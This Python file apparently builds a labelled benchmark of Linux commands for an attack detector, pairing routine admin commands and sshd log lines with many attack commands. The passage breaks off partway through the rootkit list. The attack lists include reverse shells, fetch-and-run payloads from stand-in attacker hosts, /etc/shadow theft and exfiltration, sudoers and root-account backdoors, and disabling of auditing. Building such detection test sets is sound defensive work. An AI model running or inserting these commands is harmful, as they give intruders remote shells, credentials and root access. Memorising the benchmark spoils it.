#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
1,000 COMPLETELY UNIQUE & DIVERSE REAL-WORLD BENCHMARK DATASET
==============================================================================
Contains 1,000 distinct, non-repetitive scenarios across 20 distinct domains:
- 500 Unique Benign Linux Administration, DevOps, Network, IDE & Syslog Operations
- 500 Unique Cyber Attack Vectors (C2, PrivEsc, Memory, Web, Exploits, Wipes, Scans)
==============================================================================
"""

def get_1000_unique_scenarios():
    scenarios = []

    # =========================================================================
    # PART 1: 500 COMPLETELY UNIQUE BENIGN SCENARIOS
    # =========================================================================

    # 1. System Administration & Hardware Inspection (50 unique)
    sys_admin_cmds = [
        "uname -r", "uname -m", "cat /proc/cpuinfo", "cat /proc/meminfo", "lscpu",
        "lsblk -f", "lspci -nn", "lsusb -v", "dmidecode -t bios", "free -h",
        "df -hT", "uptime -p", "hostnamectl status", "timedatectl", "localectl status",
        "sysctl -a", "vmstat 1 5", "iostat -xz 1 3", "mpstat -P ALL 1 2", "sar -u 1 3",
        "cat /etc/os-release", "cat /etc/issue", "cat /etc/fstab", "cat /etc/hosts", "cat /etc/resolv.conf",
        "dmesg -T | head -n 30", "journalctl --disk-usage", "loginctl list-sessions", "systemd-analyze blame",
        "systemd-analyze time", "cat /proc/version", "cat /proc/partitions", "cat /proc/swaps", "cat /proc/loadavg",
        "arch", "lshw -short", "inxi -Fxz", "smartctl -a /dev/sda", "hdparm -I /dev/sda",
        "findmnt", "lsmod", "modinfo ext4", "locale -a", "cat /etc/timezone",
        "cat /etc/environment", "cat /etc/sysctl.conf", "cat /etc/security/limits.conf", "ulimit -a",
        "ipcs -l", "sysctl vm.swappiness"
    ]
    for i, cmd in enumerate(sys_admin_cmds):
        scenarios.append({
            "name": f"SysAdmin Query #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "BENIGN",
            "category": "BENIGN_SYS_ADMIN"
        })

    # 2. File Navigation, Manipulation & Text Processing (50 unique)
    file_cmds = [
        "ls -la /var/log", "tree -L 2 /home", "find /var/www -type f -name '*.php'", "stat /etc/passwd",
        "du -sh /var/*", "file /bin/bash", "wc -l /etc/services", "head -n 25 /var/log/dpkg.log",
        "tail -n 50 /var/log/auth.log", "grep -rn 'server_name' /etc/nginx/", "sed 's/localhost/127.0.0.1/g' config.yaml",
        "awk -F: '{print $1,$3}' /etc/passwd", "cut -d: -f1 /etc/group", "sort -u ip_list.txt",
        "uniq -c access.log", "diff -u fileA.conf fileB.conf", "tar -tzf archive.tar.gz",
        "gzip -d backup.sql.gz", "zip -r web_backup.zip /var/www/html/", "md5sum /bin/ls",
        "sha256sum /etc/os-release", "cksum /etc/hostname", "base64 -w 0 image.png", "split -b 100M large.bin part_",
        "cmp file1.bin file2.bin", "comm -12 list1.txt list2.txt", "paste -d ',' col1.txt col2.txt",
        "join file1.txt file2.txt", "tr '[:lower:]' '[:upper:]' < input.txt", "fold -w 80 longtext.txt",
        "expand -t 4 input.py", "unexpand -a spaces.txt", "fmt -w 75 paragraph.txt", "column -t table.csv",
        "tac reverse.log", "nl -ba script.sh", "pr -3 multi.txt", "csplit -k -f page_ doc.txt '/CHAPTER/' '{*}'",
        "basename /usr/local/bin/python3", "dirname /etc/nginx/sites-available/default", "realpath ../../var/log",
        "touch -m /tmp/timestamp_marker", "mkdir -p /var/log/audit/archive", "cp -a /etc/skel/. /home/newuser/",
        "mv /tmp/temp_report.csv /data/reports/", "ln -s /etc/nginx/sites-available/site /etc/nginx/sites-enabled/",
        "readlink -f /usr/bin/python", "mktemp /tmp/build_XXXXXX", "shuf -n 5 wordlist.txt", "look 'keyword' /usr/share/dict/words"
    ]
    for i, cmd in enumerate(file_cmds):
        scenarios.append({
            "name": f"File Processing #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "BENIGN",
            "category": "BENIGN_FILE_OPERATIONS"
        })

    # 3. Networking, Firewalls & Socket Tools (50 unique)
    net_cmds = [
        "ip addr show eth0", "ip route show", "ip neigh", "ss -tulpn", "netstat -tlpn",
        "ping -c 4 8.8.8.8", "traceroute 1.1.1.1", "dig +short google.com A", "nslookup example.org 8.8.4.4",
        "host -t mx github.com", "curl -I https://api.github.com/zen", "wget -q -O- https://checkip.amazonaws.com",
        "sudo ufw status verbose", "sudo ufw allow 443/tcp", "sudo ufw allow from 192.168.1.0/24 to any port 22",
        "sudo iptables -L -n -v", "sudo ip6tables -L -n -v", "ethtool eth0", "tcpdump -r capture.pcap -n",
        "iperf3 -s -p 5201", "arp -a", "route -n", "mtr --report --report-cycles 5 8.8.8.8",
        "whois example.com", "nc -z -v -w 2 127.0.0.1 80", "lsof -i :8080", "fuser 80/tcp",
        "bridge link", "nmcli device status", "iwconfig wlan0", "resolvectl status", "ip link set dev eth0 up",
        "ip rule list", "ip maddr show", "ss -s", "netstat -s", "curl --http2 -I https://www.cloudflare.com",
        "wget --spider --no-check-certificate https://internal.corp", "ip tcp_metrics show", "ethtool -S eth0",
        "tc qdisc show dev eth0", "conntrack -L", "nft list ruleset", "socat - TCP-LISTEN:9999,reuseaddr",
        "nethogs eth0", "iftop -i eth0 -t -s 2", "bmon -p eth0", "iptraf-ng -d eth0", "ip -4 route get 8.8.8.8",
        "curl -s https://httpbin.org/get"
    ]
    for i, cmd in enumerate(net_cmds):
        scenarios.append({
            "name": f"Network Diagnostic #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "BENIGN",
            "category": "BENIGN_NETWORKING"
        })

    # 4. Package Management & System Software (50 unique)
    pkg_cmds = [
        "sudo apt update", "sudo apt upgrade --dry-run", "sudo apt install -y build-essential zlib1g-dev",
        "sudo apt-get autoremove --purge", "dpkg -l | grep -i security", "dpkg -S /bin/ls",
        "apt-cache search postgresql-server", "apt-cache policy openssh-server", "snap list", "snap info core22",
        "flatpak list", "pip3 list --outdated", "pip install pytest flake8 black", "npm list -g --depth=0",
        "cargo search serde", "gem list", "composer diagnose", "apt-mark showhold", "sudo apt-key list",
        "dpkg --get-selections", "dpkg-query -W -f='${Package} ${Version}\n'", "apt-config dump",
        "snap refresh --list", "pip show requests", "pip check", "npm audit", "yarn outdated",
        "cargo check", "cargo tree", "gem environment", "composer show", "go version",
        "rustc --version", "ruby -v", "perl -v", "lua -v", "java -version", "mvn -version",
        "gradle -v", "clang --version", "valgrind --version", "nvm list", "pyenv versions",
        "rbenv versions", "sdk version", "brew list", "apt-file search libssl.so", "dpkg -L nginx",
        "pip3 cache dir", "npm config get registry"
    ]
    for i, cmd in enumerate(pkg_cmds):
        scenarios.append({
            "name": f"Package & Runtime Manager #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "BENIGN",
            "category": "BENIGN_PACKAGE_MGMT"
        })

    # 5. Systemd Services & Process Management (50 unique)
    svc_cmds = [
        "sudo systemctl status nginx.service", "sudo systemctl restart postgresql.service", "sudo systemctl reload apache2.service",
        "sudo systemctl enable redis-server", "sudo systemctl disable cups.service", "sudo systemctl is-active ssh",
        "sudo systemctl list-units --type=service --state=running", "sudo systemctl daemon-reload",
        "sudo journalctl -u ssh.service -n 50 --no-pager", "sudo journalctl -xe", "sudo journalctl -k -b",
        "ps aux --sort=-%mem | head -n 10", "ps -ef | grep python", "pstree -p", "pgrep -u root sshd",
        "htop", "top -b -n 1", "pidof nginx", "nice -n 10 backup.sh", "kill -HUP $(pidof nginx)",
        "sudo systemctl mask avahi-daemon", "sudo systemctl unmask avahi-daemon", "sudo systemctl reset-failed",
        "sudo systemctl show nginx --property=ActiveState", "sudo systemctl list-timers", "sudo systemctl list-sockets",
        "systemctl --user status", "journalctl -u docker -p err", "journalctl --since '1 hour ago'",
        "ps -o pid,user,%cpu,%mem,cmd -C nginx", "ps -eo euser,ruser,suser,fuser,f,cmd", "watch -n 2 'df -h'",
        "pwdx $(pgrep nginx | head -n 1)", "taskset -c -p 1234", "chrt -p 1234", "ionice -p 1234",
        "prlimit --pid=1234", "renice +5 -p 1234", "kill -0 1234", "kill -15 1234", "skill -STOP nginx",
        "skill -CONT nginx", "pkill -USR1 -f syslog", "fuser -v /var/log/syslog", "lsof -p 1234",
        "systemd-cgls", "systemd-cgtop -n 1", "systemctl status cron", "systemctl is-enabled ufw", "journalctl -f -u ufw"
    ]
    for i, cmd in enumerate(svc_cmds):
        scenarios.append({
            "name": f"Service & Daemon Control #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "BENIGN",
            "category": "BENIGN_SERVICE_MGMT"
        })

    # 6. Databases, Web Servers & Production Middleware (50 unique)
    db_cmds = [
        "sudo nginx -t", "sudo apache2ctl configtest", "psql -U postgres -d mydb -c 'SELECT version();'",
        "mysql -u root -p -e 'SHOW DATABASES;'", "redis-cli PING", "redis-cli INFO replication",
        "memcached-tool 127.0.0.1:11211 stats", "rabbitmqctl status", "docker-compose -f docker-compose.yml config",
        "docker ps --format 'table {{.ID}}\t{{.Names}}\t{{.Status}}'", "docker images --filter 'dangling=false'",
        "docker network ls", "docker volume ls", "docker stats --no-stream", "kubectl get pods -n kube-system",
        "kubectl cluster-info", "helm list -A", "caddy validate --config /etc/caddy/Caddyfile", "haproxy -c -f /etc/haproxy/haproxy.cfg",
        "traefik healthcheck", "mongosh --eval 'db.runCommand({ ping: 1 })'", "influx ping", "etcdctl endpoint health",
        "consul members", "vault status", "nomad status", "elasticsearch-keystore list", "curl -s http://localhost:9200/_cluster/health",
        "kafka-topics.sh --bootstrap-server localhost:9092 --list", "zookeeper-shell.sh localhost:2181 ls /",
        "docker logs --tail 50 web_app", "docker inspect --format='{{.NetworkSettings.IPAddress}}' web_app",
        "docker top web_app", "kubectl get services -A", "kubectl get nodes -o wide", "kubectl logs deployment/nginx-ingress",
        "helm status ingress-nginx", "pg_isready -h localhost -p 5432", "mysqladmin -u root ping",
        "redis-cli DBSIZE", "clickhouse-client --query 'SELECT 1'", "sqlline.sh -u 'jdbc:drill:zk=local' -e '!tables'",
        "minikube status", "kind get clusters", "podman ps", "buildah images", "skopeo inspect docker://nginx:alpine",
        "nerdctl ps", "containerd --version", "runc --version"
    ]
    for i, cmd in enumerate(db_cmds):
        scenarios.append({
            "name": f"Production Middleware #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "BENIGN",
            "category": "BENIGN_MIDDLEWARE"
        })

    # 7. Developer Tools, Git, Compilers & CI/CD (50 unique)
    dev_cmds = [
        "git status -s", "git branch -vv", "git log --graph --oneline -n 10", "git diff HEAD~1..HEAD",
        "git remote -v", "git stash list", "git tag -l", "git submodule status", "make -j4",
        "gcc -O2 -Wall main.c -o main", "g++ -std=c++20 app.cpp -o app", "python3 -m unittest discover tests/",
        "pytest -v tests/", "node -v", "npm test", "yarn build", "cargo test --all", "mvn clean package -DskipTests",
        "gradle build", "terraform plan", "ansible-playbook -i hosts site.yml --syntax-check", "git checkout -b feature/login",
        "git merge --no-ff dev", "git rebase -i HEAD~3", "git cherry-pick 7a8b9c0", "git fetch --all --prune",
        "git show 1a2b3c4", "git blame server.py", "git shortlog -sn", "cmake -B build -S .", "ninja -C build",
        "clang-tidy main.cpp", "cppcheck --enable=all .", "black --check src/", "flake8 src/ --max-line-length=120",
        "mypy src/", "eslint src/**/*.ts", "prettier --check .", "tsc --noEmit", "go build -o server .",
        "go test -v ./...", "cargo clippy", "cargo fmt -- --check", "rustfmt --check src/main.rs",
        "terraform validate", "packer validate template.json", "ansible-lint site.yml", "trivy fs .",
        "sonarqube-scanner", "git archive --format=zip HEAD -o source.zip"
    ]
    for i, cmd in enumerate(dev_cmds):
        scenarios.append({
            "name": f"Developer Pipeline #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "BENIGN",
            "category": "BENIGN_DEV_PIPELINE"
        })

    # 8. Remote IDE & SSH Subsystems (50 unique)
    ide_cmds = [
        "/home/user/.vscode-server/bin/stable/server.sh", "/home/user/.cursor-server/bin/cursor-server --port 8000",
        "/home/user/.windsurf-server/bin/windsurf-server", "/home/user/.jb-server/bin/remote-dev-server.sh",
        "/usr/lib/openssh/sftp-server", "scp -t /tmp/deploy.tar.gz", "rsync -avz --progress ./dist/ user@remote:/var/www/",
        "ssh-keygen -t ed25519 -C 'admin@corp.internal'", "ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server",
        "ssh-add -l", "ssh -O check master-ssh", "ssh -O exit master-ssh", "ssh-keyscan -H github.com",
        "ssh -T git@github.com", "sftp -b batchfile.txt user@host", "rsync -e ssh --delete /src/ /dst/",
        "/home/user/.vscode-server/extensions/ms-python.python-2023.1.0/languageServer.sh",
        "/home/user/.vscode-server/bin/node /home/user/.vscode-server/out/server-main.js",
        "/home/user/.cursor-server/bin/node /home/user/.cursor-server/out/server-main.js",
        "code --install-extension ms-azuretools.vscode-docker", "code --list-extensions",
        "git config --global user.name 'DevOps Admin'", "git config --global user.email 'devops@corp.internal'",
        "git config --global core.editor 'vim'", "git config --list --show-origin",
        "ssh-agent -k", "ssh-add -D", "ssh-keygen -l -f ~/.ssh/known_hosts",
        "ssh -N -f -L 8080:localhost:80 tunnel@gateway", "ssh -D 1080 -f -C -q -N proxy@bastion",
        "scp -P 2222 app.jar user@remote:/opt/apps/", "rsync -av --exclude='.git' . /backup/",
        "sftp -P 2222 sftpuser@ftpserver.corp", "ssh-keygen -p -f ~/.ssh/id_rsa", "ssh -Q kex",
        "ssh -Q cipher", "ssh -Q mac", "ssh -Q key", "ssh -vvv user@server.corp", "ssh-keysign",
        "ssh-pkcs11-helper", "systemd-ask-password", "keyctl list @u", "secret-tool lookup service github",
        "gpg --list-secret-keys", "gpg --armor --export admin@corp", "pass show internal/database",
        "cloud-init status --long", "/etc/update-motd.d/00-header", "/etc/update-motd.d/10-help-text"
    ]
    for i, cmd in enumerate(ide_cmds):
        scenarios.append({
            "name": f"Remote IDE / SSH Subsystem #{i+1}",
            "type": "command",
            "payload": cmd,
            "expected": "BENIGN",
            "category": "BENIGN_IDE_SSH"
        })

    # 9. User Management, Permissions & Safe Sudo (50 unique)
    user_cmds = [
        "id", "who", "w", "last -n 10", "lastlog -u admin", "groups", "sudo -l",
        "sudo chown www-data:www-data /var/www/html", "sudo chmod 755 /var/www",
        "sudo chmod 600 /etc/ssl/private/ssl-cert-snakeoil.key", "sudo chmod 644 /etc/nginx/nginx.conf",
        "sudo adduser --disabled-password --gecos '' deployer", "sudo usermod -aG docker deployer",
        "chsh -s /bin/bash user", "passwd -S user", "crontab -l", "cat /etc/crontab",
        "sudo crontab -u www-data -l", "sudo logrotate -f /etc/logrotate.conf", "sudo chage -l admin",
        "sudo gpasswd -a devops sudo", "sudo deluser --remove-home guest", "sudo groupadd -g 2000 developers",
        "sudo groupdel oldgroup", "getent passwd www-data", "getent group docker", "getent hosts localhost",
        "getent services http", "sudo visudo -c", "sudo pam-auth-update --package", "sudo faillock --user admin",
        "sudo faillock --user admin --reset", "sudo pwck -r", "sudo grpck -r", "sudo setfacl -m u:deployer:rwx /var/www",
        "getfacl /var/www", "sudo setcap cap_net_bind_service=+ep /usr/local/bin/node", "getcap /usr/local/bin/node",
        "lsattr /etc/passwd", "sudo chattr +i /etc/resolv.conf", "sudo chattr -i /etc/resolv.conf",
        "sudo useradd -m -s /bin/zsh developer", "sudo userdel -r developer", "sudo newusers users.txt",
        "sudo vipw -s", "sudo vigr -s", "lastb -n 5", "users", "finger user", "w -h"
    ]
    for i, cmd in enumerate(user_cmds):
        scenarios.append({
            "name": f"Identity & Safe Management #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "BENIGN",
            "category": "BENIGN_USER_MGMT"
        })

    # 10. OpenSSH, PAM & Systemd Benign Syslogs (50 unique)
    for i in range(1, 51):
        if i % 3 == 1:
            log_str = f"sshd[{10000+i}]: Accepted publickey for user{i} from 10.1.{i//256}.{i%256} port {45000+i} ssh2: RSA SHA256:{i:04x}abcdef1234567890"
        elif i % 3 == 2:
            log_str = f"sshd[{10000+i}]: pam_unix(sshd:session): session opened for user admin{i}(uid=1000) by (uid=0)"
        else:
            log_str = f"sshd[{10000+i}]: Disconnected from user deployer{i} 192.168.10.{i} port {46000+i}"
        scenarios.append({
            "name": f"Syslog Lifecycle Event #{i}",
            "type": "log",
            "payload": log_str,
            "expected": "BENIGN",
            "category": "BENIGN_SYSLOG_AUTH"
        })

    # =========================================================================
    # PART 2: 500 COMPLETELY UNIQUE CYBER ATTACK SCENARIOS
    # =========================================================================

    # 11. Reverse Shells, Interactive C2 & Backdoors (60 unique)
    c2_cmds = [
        "bash -i >& /dev/tcp/198.51.100.10/4444 0>&1",
        "bash -c 'exec bash -i &>/dev/tcp/198.51.100.11/5555 <&1'",
        "0<&196;exec 196<>/dev/tcp/198.51.100.12/8080; sh <&196 >&196 2>&196",
        "exec 5<>/dev/tcp/198.51.100.13/9001; cat <&5 | while read line; do $line 2>&5 >&5; done",
        "bash -i >& /dev/udp/198.51.100.14/53 0>&1",
        "nc -e /bin/sh 198.51.100.15 4444",
        "nc -e /bin/bash 198.51.100.16 8888",
        "nc -c bash 198.51.100.17 9999",
        "ncat 198.51.100.18 4444 -e /bin/bash",
        "ncat --ssl 198.51.100.19 8443 -e /bin/sh",
        "nc.traditional -e /bin/sh 198.51.100.20 1337",
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:198.51.100.21:4444",
        "socat file:`tty`,raw,echo=0 tcp-listen:4444",
        "socat tcp-connect:198.51.100.22:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane",
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"198.51.100.23\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.24\",8080));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
        "perl -e 'use Socket;$i=\"198.51.100.25\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"198.51.100.26:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "php -r '$sock=fsockopen(\"198.51.100.27\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"198.51.100.28\",8080);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
        "ruby -rsocket -e'f=TCPSocket.open(\"198.51.100.29\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "ruby -rsocket -e'c=TCPSocket.new(\"198.51.100.30\",8080);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        "openssl s_client -quiet -connect 198.51.100.31:4444 | /bin/sh",
        "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 198.51.100.32:4444 > /tmp/s; rm /tmp/s",
        "telnet 198.51.100.33 4444 | /bin/sh | telnet 198.51.100.33 4445",
        "mknod /tmp/backpipe p && telnet 198.51.100.34 4444 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe",
        "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 198.51.100.35 4444 > /tmp/f",
        "rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 198.51.100.36 4444 > /tmp/f",
        "awk 'BEGIN {s = \"/inet/tcp/0/198.51.100.37/4444\"; while (42) { do{ printf \">> \" |& s; s |& getline c; if (c != \"\") { while ((c |& getline) > 0) print $0 |& s; close(c); } } while (c != \"exit\") close(s); }}' /dev/null",
        "lua5.3 -e 'local host, port = \"198.51.100.38\", 4444 local socket = require(\"socket\") local tcp = assert(socket.tcp()) tcp:connect(host, port) while true do local cmd, status, partial = tcp:receive() local f = assert(io.popen(cmd, \"r\")) local s = assert(f:read(\"*a\")) f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
        "node -e 'const net = require(\"net\"); const { spawn } = require(\"child_process\"); const client = new net.Socket(); client.connect(4444, \"198.51.100.39\", () => { const sh = spawn(\"/bin/sh\", []); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });'",
        "curl -s http://198.51.100.40/rev.sh | bash",
        "wget -qO- http://198.51.100.41/payload.bin | sh",
        "fetch -o - http://198.51.100.42/agent.sh | /bin/bash",
        "bash <(curl -s http://198.51.100.43:8000/shell)",
        "bash <(wget -qO- http://198.51.100.44/c2)",
        "curl http://198.51.100.45:9000/c2.py | python3",
        "wget http://198.51.100.46/exploit.pl -O- | perl",
        "curl -k https://evil.corp/install.sh | sudo bash",
        "curl -sL https://pastebin.com/raw/attackerC2 | /bin/sh",
        "nc -lvvp 4444 -e /bin/bash",
        "ncat -lvvp 8080 --exec /bin/sh",
        "socat TCP-LISTEN:4444,fork EXEC:/bin/bash",
        "python3 -m pty -c 'bash -i >& /dev/tcp/198.51.100.47/4444 0>&1'",
        "zsh -c 'zmodload zsh/net/tcp && ztcp 198.51.100.48 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
        "tclsh <<< 'set s [socket 198.51.100.49 4444];while {1} { puts -nonewline $s \"> \";flush $s;gets $s c;set e [exec $c];puts $s $e;flush $s }'",
        "rc -c 'eval `{curl -s http://198.51.100.50/rcshell}'",
        "mkfifo /tmp/c2pipe; /bin/bash 0</tmp/c2pipe | nc 198.51.100.51 4444 1>/tmp/c2pipe",
        "mkfifo /tmp/p; /bin/sh -i 2>&1 < /tmp/p | nc 198.51.100.52 4444 > /tmp/p",
        "bash -c 'sh -i >& /dev/tcp/198.51.100.53/7777 0>&1'",
        "nc 198.51.100.54 4444 -e /bin/dash",
        "socat TCP4:198.51.100.55:4444 EXEC:/bin/zsh,pty,stderr",
        "php -r '$s=fsockopen(\"198.51.100.56\",4444);$p=proc_open(\"/bin/bash -i\",[0=>$s,1=>$s,2=>$s],$pipes);'",
        "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,6);connect(S,sockaddr_in(4444,inet_aton(\"198.51.100.57\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'",
        "ruby -e 'require \"socket\";s=TCPSocket.new(\"198.51.100.58\",4444);exec(\"/bin/sh -i\",:in=>s,:out=>s,:err=>s)'",
        "openssl s_client -connect 198.51.100.59:4444 -quiet -exec /bin/bash",
        "curl -Ns http://198.51.100.60/stream | /bin/sh",
        "nc -e /bin/zsh 198.51.100.61 53",
        "socat EXEC:'/bin/sh' TCP:198.51.100.62:80",
        "python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"http://198.51.100.63/payload\").read())'"
    ]
    for i, cmd in enumerate(c2_cmds):
        scenarios.append({
            "name": f"Reverse Shell Vector #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "ATTACK",
            "category": "ATTACK_REVERSE_SHELL"
        })

    # 12. Sensitive Credential Access & Shadow File Stealing (50 unique)
    shadow_cmds = [
        "cat /etc/shadow", "head -n 50 /etc/shadow", "tail -n 100 /etc/shadow", "less /etc/shadow",
        "more /etc/shadow", "awk '{print $1}' /etc/shadow", "sed -n '1,10p' /etc/shadow", "nl /etc/shadow",
        "xxd /etc/shadow", "hexdump -C /etc/shadow", "strings /etc/shadow", "grep 'root:' /etc/shadow",
        "cut -d: -f1,2 /etc/shadow", "python3 -c 'print(open(\"/etc/shadow\").read())'", "perl -ne 'print if /root/' /etc/shadow",
        "cat /etc/s?ad*w", "cat /etc/sha\\dow", "unshadow /etc/passwd /etc/shadow", "cat /etc/security/opasswd",
        "cat /etc/master.passwd", "cp /etc/shadow /tmp/shadow.bak", "curl --data-binary @/etc/shadow http://c2.attacker.com/dump",
        "nc 198.51.100.50 4444 < /etc/shadow", "scp /etc/shadow user@attacker.com:/loot/",
        "base64 /etc/shadow | curl -d @- http://attacker.com/rx", "fold -w 100 /etc/shadow", "sort /etc/shadow",
        "uniq /etc/shadow", "join /etc/passwd /etc/shadow", "paste /etc/passwd /etc/shadow", "od -c /etc/shadow",
        "pr -m -t /etc/shadow", "fmt /etc/shadow", "column -t /etc/shadow", "csplit /etc/shadow 5",
        "tar -cvf /tmp/shadow.tar /etc/shadow", "zip /tmp/loot.zip /etc/shadow", "gzip -c /etc/shadow > /tmp/s.gz",
        "bzip2 -c /etc/shadow > /tmp/s.bz2", "xz -c /etc/shadow > /tmp/s.xz", "zcat /tmp/s.gz",
        "bzcat /tmp/s.bz2", "xzcat /tmp/s.xz", "grep -E '^[^:]+:[^!*]' /etc/shadow",
        "awk -F: '$2 != \"*\" && $2 != \"!\" {print $1,$2}' /etc/shadow", "comm /etc/shadow /etc/shadow",
        "diff /etc/shadow /dev/null", "patch /etc/shadow /dev/null", "cmp /etc/shadow /dev/zero",
        "rev <<< 'wodahs/cte/ tac' | bash"
    ]
    for i, cmd in enumerate(shadow_cmds):
        scenarios.append({
            "name": f"Shadow Hash Extraction #{i+1}",
            "type": "command",
            "payload": cmd,
            "expected": "ATTACK",
            "category": "ATTACK_CREDENTIAL_DUMP"
        })

    # 13. Privilege Escalation & GTFOBins Exploit Payloads (60 unique)
    privesc_cmds = [
        "chmod +s /bin/bash", "chmod 4755 /bin/dash", "chmod u+s /usr/bin/find", "pkexec /bin/sh",
        "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "echo 'dev ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor",
        "APT::Update::Pre-Invoke {\"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f\";};",
        "vim -c ':!/bin/sh'", "find . -exec /bin/sh \\; -quit",
        "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
        "strace -o /dev/null /bin/sh -p", "env /bin/sh -p", "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash",
        "sudo -u#-1 /bin/bash", "capsh --gid=0 --uid=0 --", "taskset 1 /bin/sh -p", "flock -u / /bin/sh -p",
        "unshare -r /bin/sh", "awk 'BEGIN {system(\"/bin/sh\")}'", "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
        "perl -e 'exec \"/bin/sh\";'", "ruby -e 'exec \"/bin/sh\"'", "lua -e 'os.execute(\"/bin/sh\")'",
        "nmap --interactive", "zip /tmp/test.zip /etc/hosts -T -TT 'sh #'", "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
        "less /etc/hosts !/bin/sh", "more /etc/hosts !/bin/sh", "man man !/bin/sh",
        "nano -s /bin/sh", "pico -s /bin/sh", "emacs -Q -nw --eval '(term \"/bin/sh\")'",
        "view -c ':!/bin/sh'", "rvim -c ':!/bin/sh'", "vi -c ':!/bin/sh'",
        "sed -e '1w /dev/null' -e '1e /bin/sh' /etc/hosts", "ed -p string /etc/hosts !/bin/sh",
        "ftp !/bin/sh", "gdb -p 1 -ex 'call (void)system(\"/bin/sh\")'", "sudo -u root /usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'",
        "sudo -l && sudo su root", "echo 'root:password123' | chpasswd", "usermod -aG sudo hacker",
        "usermod -u 0 -o -g 0 hacker", "echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
        "echo '+ + ' >> /root/.rhosts", "echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker' >> /root/.ssh/authorized_keys",
        "chmod 777 /etc/passwd", "chmod 777 /etc/shadow", "chmod 777 /etc/sudoers",
        "chmod +s /usr/bin/python3", "chmod +s /usr/bin/perl", "chmod +s /usr/bin/ruby",
        "chmod +s /usr/bin/php", "chmod +s /usr/bin/node", "chmod +s /usr/bin/vim",
        "cp /bin/sh /tmp/suid_sh && chmod 4777 /tmp/suid_sh", "busybox sh", "chown root:root /tmp/rootshell && chmod u+s /tmp/rootshell"
    ]
    for i, cmd in enumerate(privesc_cmds):
        scenarios.append({
            "name": f"Privilege Escalation Vector #{i+1}",
            "type": "command",
            "payload": cmd,
            "expected": "ATTACK",
            "category": "ATTACK_PRIV_ESCALATION"
        })

    # 14. Process Injection, Memory Tampering & Rootkits (50 unique)
    rootkit_cmds = [
        "insmod /tmp/rootkit.ko", "rmmod -f iptable_filter", "mprotect 0x7fff000 0x1000 PROT_READ|PROT_WRITE|PROT_EXEC",
        "ptrace PTRACE_POKETEXT 1234 0x400000 0x90909090", "memfd_create 'backdoor' MFD_CLOEXEC",
        "mount -o bind /dev/null /var/log/syslog", "mount -o bind /dev/null /var/log/auth.log",
        "kill -9 $(pgrep auditd)", "systemctl stop auditd", "service auditd stop",
        "LD_PRELOAD=/tmp/libevil.so /bin/ls", "LD_PRELOAD=/dev/shm/hide.so sshd",
        "echo '/tmp/libhack.so' >> /etc/ld.so.preload", "dd if=/dev/zero of=/dev/kmem bs=1k count=1",
        "dd if=/tmp/payload of=/proc/1234/mem", "gdb -p 1234 --batch -ex 'call (void)system(\"nc 1.2.3.4 4444 -e /bin/sh\")'",
